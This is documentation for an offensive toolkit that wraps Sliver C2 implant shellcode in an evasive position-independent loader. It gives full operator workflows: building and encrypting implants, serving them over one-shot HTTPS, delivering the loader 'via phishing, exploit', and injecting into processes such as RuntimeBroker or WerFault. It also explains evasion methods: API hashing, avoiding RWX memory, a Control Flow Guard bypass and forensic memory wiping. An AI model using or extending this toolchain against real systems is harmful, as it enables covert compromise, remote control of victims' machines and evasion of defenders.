# Crystal Palace Kit — Documentation

## Table of Contents

1. [What Is Crystal Palace Kit?](#1-what-is-crystal-palace-kit)
2. [Background: Cobalt Strike vs Sliver](#2-background-cobalt-strike-vs-sliver)
3. [Tool Overview](#3-tool-overview)
4. [How Crystal Palace Works](#4-how-crystal-palace-works)
5. [How PalaceKit Works (Free Replacement)](#5-how-palacekit-works-free-replacement)
6. [How CrystalKit Works (Sliver Workflow)](#6-how-crystalkit-works-sliver-workflow)
7. [Setup: PalaceKit](#7-setup-palacekit)
8. [Setup: CrystalKit](#8-setup-crystalkit)
9. [Usage: PalaceKit — Step by Step](#9-usage-palacekit--step-by-step)
10. [Usage: CrystalKit — Step by Step](#10-usage-crystalkit--step-by-step)
11. [Evasion Techniques Explained](#11-evasion-techniques-explained)
12. [The Spec DSL — Full Reference](#12-the-spec-dsl--full-reference)
13. [C Source Files — What Each Does](#13-c-source-files--what-each-does)
14. [Command Reference](#14-command-reference)
15. [Architecture Diagrams](#15-architecture-diagrams)
16. [Troubleshooting](#16-troubleshooting)

---

## 1. What Is Crystal Palace Kit?

**Crystal Palace** is a closed-source Java application (`crystalpalace.jar`) originally developed for Cobalt Strike operators. It is a COFF (Common Object File Format) linker with a custom DSL — you give it `.c` source files and `.spec` configuration files, and it outputs a Position-Independent Code (PIC) shellcode blob that runs entirely in memory with no PE headers and no Import Address Table (IAT).

**Crystal Kit** is the set of C source files and spec files that feed into Crystal Palace. It implements:
- A reflective loader for Beacon (the Cobalt Strike implant)
- IAT hooking (intercepts `GetProcAddress`, `LoadLibraryW`, `ExitThread`)
- XOR sleep masking (encrypts Beacon in memory during sleep)
- Call stack spoofing (hides Beacon's stack from scanners)
- A PICO execution environment (tiny code generator for hook dispatch)

**This directory contains two tools** that together give you Crystal Palace Kit for Sliver:

| Tool | What it replaces | Where |
|------|-----------------|-------|
| **PalaceKit** | `crystalpalace.jar` (the Java linker) | `palacekit/` |
| **CrystalKit** | The bash scripts, Python tools, and staging workflow around Crystal Kit | `crystalkit/` |

Together they give you the full Crystal Palace Kit for Sliver — for free, no Java, no license.

---

## 2. Background: Cobalt Strike vs Sliver

Understanding *why* certain Crystal Kit features are disabled for Sliver requires understanding the runtime difference.

**Cobalt Strike Beacon** is a C DLL that runs in a single thread (mostly). It has a predictable sleep→wake→sleep cycle. Crystal Palace features are designed around this:
- **Sleep masking**: encrypt Beacon when it sleeps
- **IAT hooks**: intercept API calls from within Beacon
- **Stack spoofing**: fake the call stack during sleep

**Sliver** is written in Go. Go's runtime is fundamentally different:
- Go runs hundreds of goroutines concurrently, scheduled by its own preemptive scheduler
- The scheduler sends OS signals every ~10ms to preempt goroutines
- Go uses `NtWaitForSingleObject` for essentially all waiting (channels, timers, mutexes)

This creates incompatibilities with Crystal Kit's hook/mask/spoof system:

| Feature | Cobalt Strike | Sliver | Why disabled in Sliver |
|---------|---------------|--------|------------------------|
| IAT hooks (`hooks.c`) | ✅ Works | ❌ Stub | Go scheduler preempts every 10ms; hook state corrupted between preemptions |
| Sleep mask (`mask.c`) | ✅ Works | ❌ Stub | Go goroutines run while XOR is in progress → reads encrypted code → crash |
| Stack spoof (`spoof.c`) | ✅ Works | ❌ Stub | Go's stack is managed by the runtime; spoofing breaks the unwinder |

**What CrystalSliver (the original Sliver port) does**: It uses Crystal Kit's C sources but disables the three incompatible features. It still requires `crystalpalace.jar` as the linker.

**What we do**: Same adaptation (disable hooks/mask/spoof), but **PalaceKit replaces crystalpalace.jar** entirely. No Java dependency.

---

## 3. Tool Overview

### PalaceKit

PalaceKit is a Go application that reimplements `crystalpalace.jar` as a native binary.

**What it does:**
1. Parses AMD64 COFF `.o` files (from the C compiler)
2. Merges multiple COFF objects into a single code image
3. Applies all relocations (REL32, ADDR64, etc.)
4. Evaluates a Crystal Kit `.spec` file (the DSL)
5. Fills named COFF sections (`dll`, `mask`, `pico`) with runtime data
6. Outputs a flat PIC shellcode blob

**What it does NOT need:**
- Java (no `crystalpalace.jar`)
- `libtcg.x64.zip` (the TCG library — replaced by stub PICO format)
- The actual Crystal Palace distribution

### CrystalKit

CrystalKit is the operator workflow tool built around Crystal Palace for Sliver.

**What it does:**
- Generates Sliver implants in the right format
- Encrypts payloads with ChaCha20-Poly1305 (upgrade from CrystalSliver's AES-CBC)
- Cross-compiles Go stager/loader binaries with keys embedded
- Stages over one-time HTTPS (self-signed ECDSA cert, URL dies after one download)
- Wraps post-ex DLLs in Crystal Palace PICO
- Manages the build pipeline

---

## 4. How Crystal Palace Works

This section explains what `crystalpalace.jar` does, so you understand what PalaceKit reimplements.

### The COFF Linking Process

COFF is the object file format output by compilers on Windows (and by MinGW/GCC with `-c`). A COFF file contains:
- **Sections**: `.text` (machine code), `.rdata` (read-only data), `.data` (writable data)
- **Symbols**: names and their locations within sections
- **Relocations**: instructions to the linker about where to patch addresses

When you compile with:
```
x86_64-w64-mingw32-gcc -DWIN_X64 -shared -Wall -c loader.c -o loader.x64.o
```

You get a COFF object with relocations that say things like:
> "At offset 0x42 in `.text`, write the 32-bit relative address of the symbol `resolve_all`"

Crystal Palace reads all these COFF objects, merges their sections, and applies all relocations. The result is a single blob of machine code that works anywhere in memory.

### The Spec DSL

A `.spec` file is a set of directives processed in order:

```
x64:
    load "bin/loader.x64.o"
        make pic +gofirst

    load "bin/services.x64.o"
        merge

    generate $MASK 128

    push $DLL
        xor $MASK
        preplen
        link "dll"
```

This is a script telling Crystal Palace:
1. Load `loader.x64.o` as the primary object, make it PIC, put `go()` at offset 0
2. Merge `services.x64.o` into the code region
3. Generate 128 random bytes stored as `$MASK`
4. Push the `$DLL` variable (your Sliver shellcode) onto the stack...
5. ...XOR it with `$MASK`...
6. ...prepend a 4-byte length field...
7. ...store as the `dll` named section

### Named Sections and GETRESOURCE

The C source `loader.c` declares zero-length symbols in named sections:

```c
char _DLL_[0]  __attribute__((section("dll")));
char _MASK_[0] __attribute__((section("mask")));
char _PICO_[0] __attribute__((section("pico")));
```

These are placeholders. Crystal Palace **fills** them with real data from the spec's `link` directives. At runtime, `GETRESOURCE(_DLL_)` expands to `(char *)&_DLL_` which points to:

```c
typedef struct {
    uint32_t len;    // length of the data that follows
    uint8_t  value[];// the actual data bytes
} RESOURCE;
```

So when `go()` runs on the target machine, it reads the XOR-encrypted Sliver shellcode and the XOR key directly from its own memory — no file I/O, no network request.

### The PICO System

Crystal Palace includes a TCG (Tiny Code Generator) library (`libtcg.x64.zip`) that compiles a mini execution environment — the PICO. For Cobalt Strike, the PICO hosts the hook functions (`GetProcAddress`, `LoadLibraryW`, `ExitThread`) using a tag-based dispatch system.

For Sliver, PalaceKit replaces the TCG PICO with a simplified stub:
- Two exported functions: `setup_hooks` (tag 0) and `setup_memory` (tag 1)
- Both are no-ops — they do nothing
- The PICO blob is a simple binary: `[total_size][num_exports][tag/offset pairs][code bytes]`

The `go()` function still calls through the PICO (to maintain API compatibility with the Crystal Kit C code), but the calls return immediately.

---

## 5. How PalaceKit Works (Free Replacement)

### COFF Parser (`internal/coff/`)

Reads a COFF binary and extracts:
- File header (machine type, section count, symbol table pointer)
- Section headers (name, data offset, relocation offset)
- Section data (raw bytes)
- Relocation records (location, symbol index, type)
- Symbol table (names, section numbers, values)

Handles the COFF string table for section names longer than 8 characters (referenced as `/offset` in the section header).

### Linker (`internal/link/`)

Maintains three accumulation buffers: `code` (.text), `rdata` (.rdata), `data` (.data).

For each COFF object merged in:
1. Append each section's data to the appropriate buffer, recording the base offset
2. Register all symbols with their section + offset
3. Apply each relocation:

**REL32** (the most common type in PIC code):
```
target_offset - (source_offset + 4)
```
Computes a PC-relative 32-bit offset. The CPU adds this to the instruction pointer (which points to the next instruction, hence `+4`) to get the target address.

**+gofirst rotation**: After merging, if `+gofirst` was specified, the linker finds the `go` symbol in `.text` and rotates the entire code buffer so `go` lands at byte offset 0. This means the shellcode's natural entry point is the very first byte — no entry stub needed.

### Spec Evaluator (`internal/spec/`)

Processes the spec file line by line. Key operations:

| Directive | What PalaceKit does |
|-----------|---------------------|
| `load "file.o"` | Parse COFF, call linker.MergeObject() |
| `make pic +gofirst` | Pass `goFirst=true` to MergeObject |
| `merge` | Same as load but without gofirst (appends) |
| `dfr "resolve" "ror13"` | No-op (C code already uses ROR13) |
| `mergelib "lib.zip"` | Open ZIP, merge each `.o` inside |
| `attach "DLL$Func" "sym"` | No-op (C calls `_Func` directly) |
| `generate $VAR N` | Generate N random bytes → `$VAR` |
| `push $VAR` | Push variable bytes onto stack |
| `xor $MASK` | XOR top of stack with `$MASK` bytes |
| `preplen` | Prepend uint32 length to stack top |
| `link "name"` | Pop stack, store as named section |
| `run "sub.spec"` | Evaluate sub-spec, push output blob |
| `exportfunc "f" "__tag_f"` | Assign tag ID for PICO export |
| `export` | End of spec (triggers assembly) |

### Assembly

Final output layout:
```
[code bytes]      ← merged .text from all COFF objects
[rdata bytes]     ← merged .rdata (string constants, etc.)
[data bytes]      ← merged .data (global variables)
[dll section]     ← XOR'd Sliver shellcode with RESOURCE header
[mask section]    ← XOR key with RESOURCE header
[pico section]    ← PICO blob (two no-op stubs)
```

REL32 relocations within the code reference rdata and data via offsets that assume this exact layout, so the blob is self-contained and position-independent.

---

## 6. How CrystalKit Works (Sliver Workflow)

### The Injection Flow (No Crystal Palace Needed)

The primary workflow in CrystalKit does NOT require Crystal Palace at all:

```
Generate Sliver shellcode (.bin)
          ↓
CrystalKit encrypt
  • Generate ChaCha20-Poly1305 key + nonce (random)
  • Encrypt shellcode → payload.enc
          ↓
CrystalKit cross-compile stager
  • Go source: cmd/loader/main.go
  • Bake key+nonce+URL into binary with -ldflags
  • mingw-w64 cross-compile → loader.exe (Windows x64)
          ↓
CrystalKit serve
  • One-shot HTTPS server (self-signed ECDSA P-256)
  • Random URL path (/a3f91c04...)
  • Server exits 500ms after first download
          ↓
Deliver loader.exe to target
  • Runs on Windows x64
  • Fetches payload.enc via WinHTTP
  • Decrypts with ChaCha20-Poly1305 (exits if tampered)
  • Finds/spawns host process (RuntimeBroker, WerFault, dllhost, notepad)
  • NtAllocateVirtualMemory(host, RW) → NtWriteVirtualMemory → NtProtectVirtualMemory(RX)
  • NtCreateThreadEx(host, shellcode_entry)
  • Loader exits cleanly
          ↓
Sliver callbacks to C2
```

### The PICO Flow (Crystal Palace / PalaceKit Required)

For the full Crystal Palace loader experience:

```
Generate Sliver shellcode (--format shellcode, NOT --format shared)
          ↓
PalaceKit build
  • Compile loader.c, services.c, pico.c, etc. (make loader)
  • Process loader.spec through COFF linker
  • Embed XOR'd shellcode in "dll" section
  • Build PICO blob for "pico" section
  • Output: palace.bin (standalone PIC shellcode)
          ↓
Deliver + execute palace.bin via any method
  • go() entry at offset 0
  • Resolves all APIs via ROR13 PEB walk
  • Sets up PICO (calls setup_hooks no-op, setup_memory no-op)
  • XOR-decrypts Sliver shellcode from "dll" section
  • NtCreateThreadEx to run it
```

---

## 7. Setup: PalaceKit

### Prerequisites

```bash
# Install mingw-w64 cross-compiler
apt install mingw-w64

# Verify
x86_64-w64-mingw32-gcc --version

# Go 1.21+
go version
```

### Build Steps

```bash
cd Crystal-Palace-Kit/palacekit

# Build everything: C loader objects + Go CLI
make all
```

Expected output:
```
x86_64-w64-mingw32-gcc ... src/unity.c   -o bin/loader.x64.o
x86_64-w64-mingw32-gcc ... src/pico.c    -o bin/pico.x64.o
x86_64-w64-mingw32-gcc ... src/hooks.c   -o bin/hooks.x64.o
x86_64-w64-mingw32-gcc ... src/spoof.c   -o bin/spoof.x64.o
x86_64-w64-mingw32-gcc ... src/cfg.c     -o bin/cfg.x64.o
x86_64-w64-mingw32-gcc ... src/cleanup.c -o bin/cleanup.x64.o
go build -o palacekit ./cmd/palacekit
```

The C sources are compiled as a **unity build** (`unity.c` includes all sources into one translation unit). This eliminates MinGW's `.refptr`/ADDR64 cross-TU global indirection, which stores absolute runtime addresses incompatible with PIC shellcode.

Or build stages separately:
```bash
make loader   # C objects only
make cli      # Go CLI only
```

---

## 8. Setup: CrystalKit

### Prerequisites

```bash
apt install mingw-w64 nasm

# Optional: garble for binary obfuscation
go install mvdan.cc/garble@latest
```

### Build Steps

```bash
cd Crystal-Palace-Kit/crystalkit

# Build operator CLI
go build -o crystalkit ./cmd/crystalkit

# Build all C extensions
make all
```

### Environment Setup (for Crystal Palace features)

If you have access to Crystal Palace:
```bash
cp .crystalenv.example .crystalenv
# Edit .crystalenv:
#   CRYSTAL_PALACE_HOME=/path/to/crystal-palace
#   SLIVER_SERVER=/path/to/sliver-server  # optional
```

The primary injection workflow (`crystalkit inject`) does **not** need Crystal Palace.

---

## 9. Usage: PalaceKit — Step by Step

### Complete Workflow

#### Step 1 — Start your Sliver listener

On the Sliver server:
```
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs
ID  Name  Protocol  Port
1   mtls  tcp       8888
```

#### Step 2 — Generate a Sliver shellcode

```
sliver > generate \
    --format shellcode \
    --os windows \
    --arch amd64 \
    --mtls 192.168.1.10 \
    --save implant.bin

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed
[*[*] Implant saved to implant.bin
```

**Critical**: Use `--format shellcode`, not `--format shared` (DLL). A DLL would start a second Go runtime inside the host process, which conflicts with any host process that already has a Go runtime.

#### Step 3 — Wrap with PalaceKit

```bash
cd Crystal-Palace-Kit/palacekit

./palacekit build \
    --shellcode implant.bin \
    --spec loader/loader.spec \
    --output build/palace.bin
```

Output:
```
[*] Shellcode: 589824 bytes
[+] Loader: 4218 bytes → build/palace.bin
```

What happened:
- `loader.spec` was evaluated
- All 8 COFF objects were merged and linked
- A 128-byte random XOR key was generated
- The shellcode was XOR-encrypted and stored in the `dll` section
- A PICO blob (two no-op stubs) was built and stored in the `pico` section
- Everything was assembled into a 4KB PIC shellcode

#### Step 4 — Serve the payload

```bash
./palacekit serve --payload build/palace.bin --port 8443
```

```
[*] Serving 4218 bytes on https://0.0.0.0:8443/a3f91c04b2e8d17f
```

The server uses a self-signed ECDSA P-256 certificate and a random URL path. It shuts down 500ms after the first successful download.

#### Step 5 — Execute on target

Fetch and execute `palace.bin` on the Windows target via any available method:
- PowerShell download + inject
- Process injection via an existing tool
- SleepKit or MaskKit (wrap `palace.bin` for an additional masking layer)

When it runs:
1. `go()` at offset 0 executes (PIC entry — no relocation needed)
2. All APIs resolved via ROR13 PEB walk (no IAT)
3. Sliver shellcode XOR-decrypted from `dll` section
4. Thread created via `NtCreateThreadEx` (no IAT)
5. Sliver connects back to your mTLS listener

#### Step 6 — Catch the session

```
sliver > sessions

ID         Name           Transport  Remote Address  Hostname  ...
ae3f9124   DESKTOP-A4B2C  mtls       192.168.1.55:...  WIN10    ...

sliver > use ae3f9124

sliver (DESKTOP-A4B2C) >
```

### Verify Hashes

After changing targets or Windows versions, verify that the ROR13 hashes in `src/services.c` are correct for your target's ntdll:

```bash
./palacekit gen-hashes

NtAllocateVirtualMemory      0xD33BCABD
NtProtectVirtualMemory       0x8C394D89
NtCreateThreadEx             0x4D1DEB74
NtWaitForSingleObject        0xAE06C1B2
NtFreeVirtualMemory          0xDB63B5AB
RtlExitUserThread            0xFF7F061A
VirtualAlloc                 0x91AFCA54
VirtualProtect               0x7946C61B
VirtualFree                  0x030633AC
LoadLibraryA                 0xEC0E4E8E
```

ROR13 hashes are computed from the function name string and are the same on all Windows versions (the names don't change). If a function isn't found, `patch_resolve` returns NULL and the call will crash — use `gen-hashes` to confirm names are correct.

---

## 10. Usage: CrystalKit — Step by Step

### Primary Workflow: Go Process Injector

This workflow does NOT require Crystal Palace.

#### Step 1 — Generate Sliver shellcode (same as above)

```
sliver > generate --format shellcode --os windows --arch amd64 --mtls 192.168.1.10 --save /tmp/implant.bin
```

#### Step 2 — Build the injection package

```bash
cd Crystal-Palace-Kit/crystalkit

./crystalkit inject \
    --shellcode /tmp/implant.bin \
    --url https://192.168.1.10:8443/p \
    --output build/ \
    --garble \
    --serve
```

What this produces:
- `build/payload.enc` — ChaCha20-Poly1305 encrypted shellcode
- `build/loader.exe` — Windows x64 EXE with key+URL baked in (garble-obfuscated)
- Starts one-shot HTTPS server at `https://192.168.1.10:8443/p`

#### Step 3 — Deliver `loader.exe` to target

Deliver via phishing, exploit, script execution, etc. When executed:

1. Connects to `https://192.168.1.10:8443/p` via WinHTTP (ignores certificate errors)
2. Decrypts payload with ChaCha20-Poly1305 — exits immediately if decryption fails (tamper detection)
3. Searches for a host process in this order:
   - `RuntimeBroker.exe`
   - `SgrmBroker.exe`
   - `WerFault.exe`
   - `dllhost.exe`
   - If none found: spawns `notepad.exe` suspended
4. Injects into the host process:
   - `NtAllocateVirtualMemory(host, PAGE_READWRITE)` — allocate RW memory
   - `NtWriteVirtualMemory(host)` — copy shellcode
   - `NtProtectVirtualMemory(host, PAGE_EXECUTE_READ)` — mark RX (no RWX)
   - `NtCreateThreadEx(host)` — start shellcode thread in host
5. Loader process exits cleanly — Sliver lives in the host process

#### Step 4 — Catch the session (same as above)

### Extended Workflow: Crystal Palace PICO

For the Crystal Palace-hardened loader (requires `crystalpalace.jar` OR PalaceKit):

```bash
./crystalkit implant \
    --shellcode /tmp/implant.bin \
    --url https://192.168.1.10:8443/p \
    --serve
```

This uses PalaceKit or Crystal Palace to build the COFF-linked shellcode, then stages it.

---

## 11. Evasion Techniques Explained

### ROR13 API Hashing (No IAT)

Standard Windows shellcode has strings like `"VirtualAlloc"` in it and an IAT entry that an EDR can flag. Our loader has neither.

Instead, the loader walks the Process Environment Block (PEB) at runtime and computes a ROR13 hash of each exported function name, comparing against a hardcoded constant:

```c
uint32_t h = 0;
while (*name) {
    h = (h >> 13) | (h << 19);  // rotate right 13 bits
    h += (uint8_t)(*name++);    // add character value
}
// h is now the ROR13 hash of the function name
```

Key properties:
- No strings — the hash constants are integers
- Works regardless of module base address (ASLR-safe)
- Same hash on all Windows versions (function names don't change)
- The IAT in the COFF blob contains zero entries

### No RWX Pages

Many memory scanners flag `PAGE_EXECUTE_READWRITE` allocations as shellcode injection. Our loader never creates them:

1. `NtAllocateVirtualMemory(..., PAGE_READWRITE)` — allocate RW
2. Copy/decrypt shellcode into the RW region
3. `NtProtectVirtualMemory(..., PAGE_EXECUTE_READ)` — mark RX
4. `NtCreateThreadEx(...)` — execute from the now-RX region

### Position-Independent Code (PIC)

The output blob has no PE headers, no import directory, no relocation directory. It's a flat array of x64 machine code that works wherever it's loaded in memory.

This is achieved through two mechanisms:
1. **REL32 relocations** in the COFF objects are resolved at link time (by PalaceKit), not at load time. No loader needed.
2. **RIP-relative addressing** — x64 instructions can reference data as an offset from the current instruction pointer. GCC uses this automatically for PIC code.

### GETRESOURCE Pattern

Named COFF sections (`dll`, `mask`, `pico`) hold runtime data. Zero-length C symbols serve as section markers:

```c
char _DLL_[0] __attribute__((section("dll")));
```

`&_DLL_` is the address of the first byte of the `dll` section. The linker fills that section with `{uint32_t len; uint8_t data[]}`. The loader reads:

```c
RESOURCE *r = (RESOURCE *)(&_DLL_);
// r->len  = length of the data
// r->value = the data bytes
```

This pattern means the XOR key and encrypted shellcode are embedded directly in the loader, found by the C code as if they were compile-time constants — but they were inserted by PalaceKit at link time.

### CFG Bypass

Windows Control Flow Guard (CFG) validates indirect call targets. When we allocate an executable region and call into it, CFG would reject the call (since the region wasn't compiled with CFG metadata).

`cfg.c` calls `SetProcessValidCallTargets` via `KernelBase.dll` to register our PICO allocation as a valid call target. This is the same technique used by Cobalt Strike's Crystal Kit.

---

## 12. The Spec DSL — Full Reference

Spec files are processed top-to-bottom. The architecture prefix (`x64:`) must come first and all directives must be indented under it.

```
x64:
    [directives]
```

### Directive Reference

#### `load "path/to/file.o"` + modifiers

Loads and merges a COFF object file.

Modifiers (on the following indented line):
- `make pic` — mark as PIC (code uses RIP-relative addressing)
- `+gofirst` — rotate merged code so the `go` symbol is at offset 0
- `+optimize` — Crystal Palace hint (no-op in PalaceKit)
- `+disco` — PRNG section ordering (no-op in PalaceKit)
- `make object +disco` — for PICO sub-specs (no-op modifier)
- `merge` — no modifier needed; append to existing code region

#### `dfr "function" "strategy"`

Registers a function as the API resolver. In Crystal Kit: `dfr "resolve" "ror13"` registers `resolve` as the function called to look up API addresses. PalaceKit no-ops this (the C code calls `patch_resolve` directly with ROR13 built in).

#### `mergelib "path/to/lib.zip"`

Opens a ZIP file and merges every `.o` file inside into the code region. Used in the original Crystal Kit for `libtcg.x64.zip` (the TCG runtime). PalaceKit supports this but the TCG library is not needed for Sliver.

#### `attach "DLL$Function" "_localName"`

Documents that `DLL!Function` should be called via the local stub `_localName`. In Crystal Palace, this triggers instruction-level patching (finds `call [RIP+IAT_offset]` patterns and patches to `call rel32`). In PalaceKit, the C code calls `_Function` directly (resolved by `resolve_all()`), so `attach` is a no-op.

#### `generate $VARNAME N`

Generates N cryptographically random bytes and stores them in the variable `$VARNAME`.

Example:
```
generate $MASK 128
```
Creates a 128-byte random XOR key in `$MASK`.

#### `push $VARNAME` / `push sectionname`

Pushes a variable's bytes or a named section's bytes onto the processing stack.

#### `xor $VARNAME`

XOR-encrypts the top of the stack with the variable's bytes (cycles through the key).

#### `preplen`

Prepends a 4-byte little-endian length field to the top of the stack, creating a `RESOURCE` struct (`{uint32_t len; uint8_t data[]}`).

#### `link "sectionname"`

Pops the top of the stack and stores the bytes as the named section with that name.

Example — the full XOR-encrypt-and-store sequence:
```
push $DLL         ← push Sliver shellcode bytes
    xor $MASK     ← XOR with the 128-byte key
    preplen       ← prepend {uint32_t len}
    link "dll"    ← store as the "dll" section
```

At runtime, `GETRESOURCE(_DLL_)` returns a pointer to `{len, XOR'd bytes}`.

#### `run "sub.spec"`

Evaluates a sub-spec file and pushes the result onto the stack. Used to build the PICO blob:

```
run "pico.spec"
    link "pico"
```

This evaluates `pico.spec`, assembles a PICO blob, and stores it as the `pico` section.

#### `exportfunc "funcName" "__tag_funcName"`

In `pico.spec` — assigns a numeric tag ID to a function. The PICO runtime uses tag IDs for dispatch:

```c
// In C:
int __tag_setup_hooks(void)  { return 0; }
int __tag_setup_memory(void) { return 1; }

// In caller:
PicoGetExport(pico_src, pico_code, __tag_setup_hooks())
```

#### `addhook "DLL$Function" "_localStub"`

Registers a hook in the PICO's hook table. For Sliver, `hooks.c` is a stub file so all hooks are no-ops.

#### `export`

Signals the end of the spec and triggers final assembly. No arguments.

---

## 13. C Source Files — What Each Does

### `loader.c` — Main Entry

**Entry point**: `void go(void *loader_arguments)`

For Sliver, `go()`:
1. Calls `resolve_all()` — resolves all NT/Win32 functions via ROR13 PEB walk
2. Sets up the PICO: allocates code+data regions, calls `PicoLoad`, marks code RX
3. Calls `setup_hooks` via PICO (no-op for Sliver)
4. Reads the XOR-encrypted shellcode from the `dll` section
5. Reads the XOR key from the `mask` section
6. Allocates RW memory, XOR-decrypts the shellcode
7. Marks the decrypted shellcode RX
8. Creates a thread via `NtCreateThreadEx` to run the shellcode
9. Waits for the thread via `NtWaitForSingleObject`
10. Calls `setup_memory` via PICO (no-op)
11. Frees the shellcode allocation

**Cobalt Strike difference**: Steps 4–11 are replaced with reflective DLL loading (parses PE headers, maps sections, fixes relocations, calls DllMain). For Sliver, we simply XOR-decrypt and thread-exec the shellcode.

### `services.c` — API Resolution

Contains:
- `patch_resolve(uint32_t hash)` — walks PEB `InLoadOrderModuleList`, hashes every exported function name with ROR13, returns the function pointer on match
- `resolve_all()` — calls `patch_resolve` for every needed function and stores in global function pointers
- Global function pointer declarations: `_NtAllocateVirtualMemory`, `_NtProtectVirtualMemory`, `_NtCreateThreadEx`, `_NtWaitForSingleObject`, `_NtFreeVirtualMemory`, `_RtlExitUserThread`, `_VirtualAlloc`, `_VirtualProtect`, `_VirtualFree`, `_LoadLibraryA`

The PEB walk:
```c
// Gets pointer to the PEB (Process Environment Block)
__asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));

// PEB.Ldr.InLoadOrderModuleList = linked list of loaded modules
// Each entry: DllBase, BaseDllName, InLoadOrderLinks
// Walk the list, for each module walk its export directory
// Hash each exported name with ROR13, compare to target hash
```

### `pico.c` — PICO Runtime Stubs

**Original purpose**: Host the TCG-compiled hook functions. Provides:
- `PicoLoad()` — copy PICO code to executable memory
- `PicoGetExport(tag)` — look up a hook function by tag ID
- `PicoDataSize()` / `PicoCodeSize()` — size of the PICO regions

**For Sliver**: No hooks, so the PICO just contains two RET stubs. The loader calls into them via PicoGetExport but they return immediately. This maintains API compatibility with the Crystal Kit C code without breaking anything.

### `hooks.c` — STUB (Disabled)

**Original purpose**: Hook `GetProcAddress`, `LoadLibraryW`, `ExitThread` inside Beacon's process to intercept DLL loads and monitor exits.

**For Sliver**: Empty stubs. Go's preemptive scheduler fires a signal every 10ms (SIGURG for goroutine preemption). Installing inline hooks corrupts the hook state between preemptions because the scheduler may save/restore CPU context mid-hook.

### `mask.c` — STUB (Disabled)

**Original purpose**: XOR-encrypt Beacon's memory (its own `.text` section) before sleeping, decrypt on wake.

**For Sliver**: Empty stubs. Go goroutines run concurrently. If one goroutine starts encrypting the code region, another goroutine may try to fetch an instruction from the same region mid-encryption → crash.

**Alternative**: MaskKit and SleepKit (in the Sleep-Mask-Kit directory) implement sleep masking correctly for Sliver using an external masker approach.

### `spoof.c` — STUB (Disabled)

**Original purpose**: Fake the call stack before sleeping so that call-stack-aware EDRs see a legitimate-looking stack.

**For Sliver**: Empty stubs. Go's stack is managed by the runtime (growable goroutine stacks). Corrupting the stack unwinding metadata breaks the runtime's ability to grow stacks and collect garbage.

### `cfg.c` — CFG Bypass

Calls `KernelBase!SetProcessValidCallTargets` to register the PICO code allocation as a valid CFG call target. Required on systems with CFG enforcement so that indirect calls into the PICO don't crash.

### `cleanup.c` — Memory Zeroing

After shellcode execution completes (thread exits), zeros the shellcode allocation before freeing it with `NtFreeVirtualMemory`. Reduces forensic artifacts — memory forensics tools that dump process memory during or after execution see zeros instead of shellcode.

---

## 14. Command Reference

### PalaceKit

```bash
# Full build (compile C objects + Go CLI)
make all

# Wrap a Sliver shellcode into a Crystal Kit loader
./palacekit build \
    --shellcode implant.bin \
    --spec loader/loader.spec \
    --output build/palace.bin \
    --verbose

# Compile C sources AND build in one command
./palacekit make-loader \
    --shellcode implant.bin \
    --output build/palace.bin

# Serve the result once over HTTPS
./palacekit serve \
    --payload build/palace.bin \
    --port 8443

# Print ROR13 hashes (verify against services.c constants)
./palacekit gen-hashes

# Manually XOR-encrypt a file (for debugging)
./palacekit xor-wrap \
    --input implant.bin \
    --output implant.enc \
    --key a1b2c3d4...   # hex, or omit for random
```

### CrystalKit

```bash
# Build CLI
go build -o crystalkit ./cmd/crystalkit

# Go process injector (no Crystal Palace needed)
./crystalkit inject \
    --shellcode implant.bin \
    --url https://192.168.1.10:8443/p \
    --output build/ \
    --garble \
    --serve

# Crystal Palace PICO implant (requires crystalpalace.jar or PalaceKit)
./crystalkit implant \
    --shellcode implant.bin \
    --url https://192.168.1.10:8443/p \
    --serve

# Post-ex DLL wrapping (requires Crystal Palace)
./crystalkit postex \
    --dll target.dll \
    --output build/postex.pico

# Serve an already-built payload
./crystalkit stage --serve \
    --payload build/payload.enc \
    --port 8443

# Build Sliver extensions
./crystalkit build-ext

# Bundle extensions for Sliver
./crystalkit bundle
```

---

## 15. Architecture Diagrams

### PalaceKit Build Pipeline

```
Source C files                     COFF objects              PalaceKit
                                                            (Go process)
loader.c     ──[mingw-gcc -c]──▶ loader.x64.o  ──┐
services.c   ──[mingw-gcc -c]──▶ services.x64.o──┤
pico.c       ──[mingw-gcc -c]──▶ pico.x64.o    ──┤         ┌──────────────┐
hooks.c      ──[mingw-gcc -c]──▶ hooks.x64.o   ──┼────────▶│ COFF Parser  │
mask.c       ──[mingw-gcc -c]──▶ mask.x64.o    ──┤         │ Reloc Engine │
spoof.c      ──[mingw-gcc -c]──▶ spoof.x64.o   ──┤         │ Spec Eval    │
cfg.c        ──[mingw-gcc -c]──▶ cfg.x64.o     ──┤         │ PICO Builder │
cleanup.c    ──[mingw-gcc -c]──▶ cleanup.x64.o ──┘         └──────┬───────┘
                                                                   │
loader.spec ─────────────────────────────────────────────────────▶│
pico.spec ───────────────────────────────────────────────────────▶│
implant.bin (Sliver shellcode) ──────────────────────────────────▶│
                                                                   │
                                                                   ▼
                                                            palace.bin
                                                      (PIC shellcode, ~4KB)
                                                      + embedded XOR'd SC
```

### Payload Memory Layout (at runtime on target)

```
 palace.bin loaded into memory at address X:

 X+0000  ┌─────────────────────────────────────────────┐
          │  go():  resolve_all() → pico setup          │  ← entry point
          │          → decrypt dll section              │
          │          → NtCreateThreadEx(shellcode)      │
          │                                             │
          │  loader.c + services.c + pico.c merged code │
          │  (.text section — PIC machine code)         │
          │                                             │
 X+????  ├─────────────────────────────────────────────┤
          │  .rdata — string constants, read-only data  │
 X+????  ├─────────────────────────────────────────────┤
          │  .data  — global variables                  │
          │  (_NtAllocateVirtualMemory, etc.)           │
 X+????  ├─────────────────────────────────────────────┤
          │  dll section:  RESOURCE {                   │
          │    uint32_t len = 589824                    │  ← XOR'd Sliver shellcode
          │    uint8_t value[589824] = { XOR'd bytes }  │
          │  }                                          │
 X+????  ├─────────────────────────────────────────────┤
          │  mask section: RESOURCE {                   │
          │    uint32_t len = 128                       │  ← XOR key
          │    uint8_t value[128] = { random bytes }   │
          │  }                                          │
 X+????  ├─────────────────────────────────────────────┤
          │  pico section: PICO blob {                  │
          │    uint32_t total_size                      │  ← PICO (two RET stubs)
          │    uint32_t num_exports = 2                 │
          │    { tag=0, offset=N }  (setup_hooks)       │
          │    { tag=1, offset=N }  (setup_memory)      │
          │    uint8_t code[] = { 0xC3, 0xC3 }         │  ← RET RET
          │  }                                          │
          └─────────────────────────────────────────────┘
```

---

